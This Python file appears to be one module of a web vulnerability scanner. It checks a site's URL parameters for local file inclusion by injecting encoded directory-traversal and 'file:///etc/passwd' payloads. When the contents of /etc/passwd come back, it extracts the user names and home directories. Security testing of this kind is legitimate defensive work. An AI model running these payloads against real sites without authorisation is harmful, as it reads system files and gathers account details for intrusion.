from abc import ABC
import requests
from JobFile import *
from DataScan import *
from Function_Signatures_of_inputBox import *
from bs4 import BeautifulSoup
import urllib.request


class Lfi(Job):

    def __init__(self, website, summary):
        self.website = website
        self.summary = summary

    """
    This function finds url parameters and check if there is possible way of attacking lfi
    """
    def do_job(self, url):
        
        # directory traversal & url encoding
        res = self.scan('%2E%2E%2F' * 10 + 'etc/passwd')
        
        if res[0] == NOT_SAFE:
            return res
        
        # file wrapper
        res = self.scan('file:///etc/passwd')
        
        if res[0] == NOT_SAFE:
            return res
        
        return res[0]
    
    

    def scan(self, payload):
        url_params = self.website.url.split('?')[-1].split('&')
        test_url = self.website.url.split('?')[0] + '?'
        
        for param in url_params:
            param = param.split('=')
            test_url += param[0] + '=' + payload + '&'
            
        #print(test_url)
            
        res = requests.get(test_url).text
        
        if 'root:x:0:0:root:/root:/bin/bash' in res:
            payload = ''
            
            for line in res[res.find('root:x:0:0:root:/root:/bin/bash'): ].split('\n'):
                if len(line.split(':')) > 1:
                    if line.split(':')[-1] == '/bin/bash': 
                        payload += 'User: ' + line.split(':')[0] + ', Home dir: ' + line.split(':')[-2] + '\n'
                else:
                    break
                
            return NOT_SAFE, payload
            
        
        return SAFE, 0
